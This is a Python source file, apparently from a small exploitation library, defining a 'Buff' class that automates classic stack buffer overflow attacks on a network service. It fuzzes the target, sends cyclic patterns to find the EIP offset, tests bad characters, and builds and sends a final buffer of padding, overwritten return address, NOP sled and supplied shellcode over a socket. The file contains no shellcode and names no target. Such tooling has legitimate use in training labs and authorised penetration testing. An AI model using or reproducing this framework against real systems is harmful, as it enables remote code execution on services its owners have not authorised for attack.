from typing import Callable
import socket

from . import constants
from . import fuzzer
from . import generator
from . import sender


# Constants
PLACEHOLDER_EIP = "BBBB"


class Buff:
    def __init__(self, target: (str, int), prefix: str, postfix: str = ""):
        # Custom exploitation methods
        self.sender = sender.send_socket
        self.fuzzer = fuzzer.fuzz

        # Target
        self.target = target

        # Bad characters default from (1, 255)
        self.bad_chars = constants.BAD_CHARS

        # Prefix and Postfix
        self.prefix = prefix
        self.postfix = postfix

        # Total Buffer Size
        self.buffer_size = None

        # EIP Address
        self.eip_offset = None
        self.eip_address = PLACEHOLDER_EIP

        # NOPS
        self.padding = ""

        # Exploit
        self.exploit = None


    # --- Set Exploiters ---
    def setSender(self, method: Callable) -> None:
        self.sender = method

    def setFuzzer(self, method: Callable) -> None:
        self.fuzzer = method


    # --- Exploit Configuration ---
    def setBadChars(self, chars: str) -> None:
        self.bad_chars = chars

    def setPrefix(self, prefix: str) -> None:
        self.prefix = prefix
    
    def setPostfix(self, postfix: str) -> None:
        self.postfix = postfix

    def setBufferSize(self, buffer_size: int) -> None:
        if buffer_size <= 0:
            raise Exception("Buffer size must be greater than 0")
        self.buffer_size = buffer_size

    def setEipAddress(self, eip: str) -> None:
        if len(eip) != 4:
            raise Exception("EIP address length must be in 4")
        self.eip_address = eip

    def setEipOffset(self, offset: int) -> None:
        if offset < 0:
            raise Exception("EIP offset cannot be negative")
        self.eip_offset = offset

    def setPaddingSize(self, length: int) -> None:
        self.padding = "\x90" * length

    def setExploit(self, exploit: str) -> None:
        self.exploit = exploit


    # --- Fuzzer ---
    def fuzz(self, timeout: int = 5) -> None:
        ip, address = self.target
        self.fuzzer(ip, address, timeout, self.prefix)


    # --- Generic Sender ---
    def send(self, buffer: str) -> None:
        ip, port = self.target
        buffer = self.prefix + buffer + self.postfix
        self.sender(ip, port, buffer)


    # --- Send Pattern ---
    def generatePattern(self) -> str:
        """
        PREFIX + BUFFERS + POSTFIX
        """
        # check Buffer Size
        if self.buffer_size is None:
            raise Exception("Buffer size is not set")

        return generator.generatePattern(self.buffer_size)

    def sendPattern(self) -> None:
        buffer = self.prefix + self.generatePattern() + self.postfix
        ip, port = self.target
        self.sender(ip, port, buffer)


    # --- Bad Character Explit ---
    def generateBadChars(self, fake_eip: str = PLACEHOLDER_EIP) -> str:
        """
        PREFIX + BUFFERS + EIP + BAD CHARACTERS + POSTFIX
        """

        # check EIP
        if self.eip_offset is None:
            raise Exception("EIP offset is not set")

        # check Buffer Size
        if self.buffer_size is None:
            raise Exception("Buffer size is not set")

        buffer = "A" * self.eip_offset
        buffer += fake_eip # fake EIP to overflow address
        buffer += self.bad_chars

        # add remaning buffers if missing
        if len(buffer) < self.buffer_size:
            buffer += "A" * (self.buffer_size - len(buffer))

        return self.prefix + buffer + self.postfix

    def sendBadChars(self, fake_eip: str = PLACEHOLDER_EIP) -> None:
        buffer = self.generateBadChars(fake_eip)
        ip, port = self.target
        self.sender(ip, port, buffer)


    # --- Real Exploit ---
    def generateExploit(self) -> str:
        """
        PREFIX + BUFFERS + EIP + PADDING + EXPLOIT + POSTFIX
        """

        # check EIP
        if self.eip_offset is None:
            raise Exception("EIP offset is not set")

        if self.eip_address == PLACEHOLDER_EIP:
            print(f"Warning: your EIP is a placeholder, {self.eip_address}. Are you sure you have set the correct return address")

        # check Buffer Size
        if self.buffer_size is None:
            raise Exception("Buffer size is not set")

        # check Exploit
        if self.exploit is None:
            raise Exception("Exploit is not set")

        buffer = "A" * self.eip_offset
        buffer += self.eip_address
        buffer += self.padding
        buffer += self.exploit

        # add remaning buffers if missing
        if len(buffer) < self.buffer_size:
            buffer += "A" * (self.buffer_size - len(buffer))

        return self.prefix + buffer + self.postfix

    def sendExploit(self) -> None:
        buffer = self.generateExploit()
        ip, port = self.target
        self.sender(ip, port, buffer)
